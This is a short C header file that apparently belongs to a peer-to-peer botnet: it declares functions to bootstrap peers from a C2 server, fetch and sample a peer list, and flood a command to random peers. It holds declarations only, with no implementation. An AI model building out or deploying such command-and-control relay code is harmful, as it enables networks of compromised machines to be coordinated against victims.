#pragma once
#include "peer-list.h"



extern PeerList global_pl;




// Bootstrap from C2 at startup
int  init_global_peers(void);



// Get the list of peers from the server
// Returns 0 on success, -1 on error, duh
int get_peer_list(PeerList *pl);

// Self-explanatory
Peer *get_random_peer(PeerList *pl);

// Relays command to any random peer
// Returns 1 on success, 0 on no one to relay to, -1 on error
int flood_command(PeerList *pl, int id, const char *cmd);